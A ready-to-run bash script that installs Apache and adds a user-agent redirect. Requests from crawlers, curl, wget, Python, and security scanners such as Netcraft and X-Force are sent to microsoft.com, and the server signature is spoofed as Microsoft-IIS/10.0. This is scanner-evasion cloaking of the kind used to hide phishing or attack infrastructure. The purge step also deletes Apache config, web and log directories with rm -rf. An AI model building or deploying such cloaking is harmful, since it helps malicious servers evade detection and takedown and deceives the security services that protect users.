#!/usr/bin/env bash
# apache_redirect_setup.sh
set -euo pipefail

# Apache setup script (Ubuntu/Debian)
# - Detects existing Apache install; prompts for fresh reinstall
# - Installs: apache2, certbot, python3-certbot-apache, libapache2-mod-security2
# - Enables apache2 service
# - Enables modules: rewrite, headers, ssl, proxy, proxy_http
# - Applies UA-based redirect block with fixed RewriteRule ^/?$
# - Applies security.conf edits + SecServerSignature, then restarts Apache
# - Idempotent: re-runs replace the managed vhost block; avoids duplicate SecServerSignature

TARGET_URL="${TARGET_URL:-https://www.microsoft.com/en-us}"
VHOST_FILE="/etc/apache2/sites-available/000-default.conf"
BACKUP_DIR="/root/apache-backups"
STAMP="$(date +%Y%m%d_%H%M%S)"

MARK_BEGIN="# BEGIN UA_REDIRECT_BLOCK (managed)"
MARK_END="# END UA_REDIRECT_BLOCK (managed)"

UA_REGEX='(google|yandex|bingbot|Googlebot|bot|spider|simple|BBBike|wget|cloudfront|curl|Python|Wget|crawl|baidu|Lynx|xforce|HTTrack|Slackbot|netcraft|NetcraftSurveyAgent|Netcraft)'

say() { printf "\n[%s] %s\n" "$(date +%H:%M:%S)" "$*"; }
die() { printf "\nERROR: %s\n" "$*" >&2; exit 1; }

need_root() {
  if [[ "${EUID}" -ne 0 ]]; then
    die "Run as root: sudo $0"
  fi
}

is_apache_installed() {
  dpkg -s apache2 >/dev/null 2>&1
}

prompt_yes_no() {
  local prompt="$1"
  local default="${2:-N}" # Y or N
  local reply
  while true; do
    if [[ "$default" == "Y" ]]; then
      read -r -p "$prompt [Y/n]: " reply || true
      reply="${reply:-Y}"
    else
      read -r -p "$prompt [y/N]: " reply || true
      reply="${reply:-N}"
    fi
    case "${reply,,}" in
      y|yes) return 0 ;;
      n|no)  return 1 ;;
      *) echo "Please answer y or n." ;;
    esac
  done
}

backup_file() {
  local f="$1"
  mkdir -p "$BACKUP_DIR"
  if [[ -f "$f" ]]; then
    cp -a "$f" "$BACKUP_DIR/$(basename "$f").$STAMP.bak"
    say "Backup saved: $BACKUP_DIR/$(basename "$f").$STAMP.bak"
  fi
}

purge_apache() {
  say "Stopping Apache (if running)..."
  systemctl stop apache2 >/dev/null 2>&1 || true

  say "Purging Apache packages + configs..."
  apt-get purge -y apache2 apache2-bin apache2-data apache2-utils || true
  apt-get autoremove --purge -y || true

  say "Removing leftover directories..."
  rm -rf /etc/apache2 /var/www /var/log/apache2 || true
}

install_packages() {
  say "sudo apt update"
  apt-get update -y

  say 'echo "Setting up Apache"'
  echo "Setting up Apache"

  say "sudo apt install apache2 -y"
  apt-get install -y apache2

  say "sudo systemctl enable apache2"
  systemctl enable apache2 >/dev/null

  say "sudo apt install certbot python3-certbot-apache -y"
  apt-get install -y certbot python3-certbot-apache

  # Must be installed BEFORE SecServerSignature is used
  say "sudo apt install libapache2-mod-security2 -y"
  apt-get install -y libapache2-mod-security2

  # Start Apache (safe if already running)
  systemctl start apache2 >/dev/null 2>&1 || true
}

enable_modules() {
  # Rewrite is required for RewriteCond/RewriteRule.
  # Headers is commonly used for hardening. Others are optional but harmless.
  say "Enabling Apache modules..."
  a2enmod rewrite >/dev/null
  a2enmod headers >/dev/null
  a2enmod ssl >/dev/null || true
  a2enmod proxy >/dev/null || true
  a2enmod proxy_http >/dev/null || true
  a2enmod security2 >/dev/null || true
}

write_vhost_block() {
  [[ -f "$VHOST_FILE" ]] || die "Vhost file not found: $VHOST_FILE"
  backup_file "$VHOST_FILE"

  # Managed block with the fixed RewriteRule pattern ^/?$
  # NOTE: RewriteCond must remain a single line.
  local block
  block=$(cat <<EOF
${MARK_BEGIN}
    # Define Redirection Target
    Define REDIR_TARGET ${TARGET_URL}

    # UA-based redirect rule (managed)
    RewriteEngine On
    RewriteCond %{HTTP_USER_AGENT} ${UA_REGEX} [NC]
    RewriteRule ^/?$ \${REDIR_TARGET} [R=302,L]
${MARK_END}
EOF
)

  if grep -qF "$MARK_BEGIN" "$VHOST_FILE"; then
    perl -0777 -i -pe "s@\Q$MARK_BEGIN\E.*?\Q$MARK_END\E@$block@gs" "$VHOST_FILE"
    say "Updated existing managed vhost block in $VHOST_FILE"
  else
    perl -0777 -i -pe "s@</VirtualHost>@$block\n\n</VirtualHost>@s" "$VHOST_FILE"
    say "Inserted managed vhost block into $VHOST_FILE"
  fi
}

apply_security_conf_changes() {
  local sec="/etc/apache2/conf-available/security.conf"
  [[ -f "$sec" ]] || die "Not found: $sec"
  backup_file "$sec"

  # Apply the two sed substitutions requested (only if those exact strings exist)
  # Then ensure SecServerSignature exists exactly once.
  say "Updating Apache security.conf (ServerSignature/ServerTokens + SecServerSignature)..."

  sed -i \
    -e 's/ServerSignature On/ServerSignature Off/g' \
    -e 's/ServerTokens OS/ServerTokens Full/g' \
    "$sec"

  # Ensure exactly one SecServerSignature line (idempotent)
  if grep -qE '^SecServerSignature ' "$sec"; then
    sed -i 's/^SecServerSignature .*/SecServerSignature Microsoft-IIS\/10.0/' "$sec"
  else
    echo 'SecServerSignature Microsoft-IIS/10.0' >> "$sec"
  fi
}

configtest_and_restart() {
  say "apachectl configtest..."
  apachectl configtest

  say "Restarting apache2..."
  systemctl restart apache2
}

show_verification_cmds() {
  say "Verify:"
  echo "  sudo apachectl -S"
  echo "  curl -I -A \"Googlebot\" http://localhost/"
  echo "  curl -I -A \"Bilal\" http://localhost/"
  echo ""
  echo "nc test (valid HTTP request):"
  echo "  printf \"GET / HTTP/1.1\\r\\nHost: localhost\\r\\nUser-Agent: Googlebot\\r\\nConnection: close\\r\\n\\r\\n\" | nc -w 2 localhost 80"
}

main() {
  need_root
  say "Target URL: ${TARGET_URL}"

  if is_apache_installed; then
    say "apache2 is installed."
    if prompt_yes_no "Do you want a FRESH install (purge + reinstall)?" "N"; then
      purge_apache
      install_packages
    else
      say "Keeping existing install. Ensuring required packages are present..."
      install_packages
    fi
  else
    say "apache2 is not installed. Installing..."
    install_packages
  fi

  enable_modules
  write_vhost_block
  apply_security_conf_changes
  configtest_and_restart
  show_verification_cmds

  say "Done."
}

main "$@"
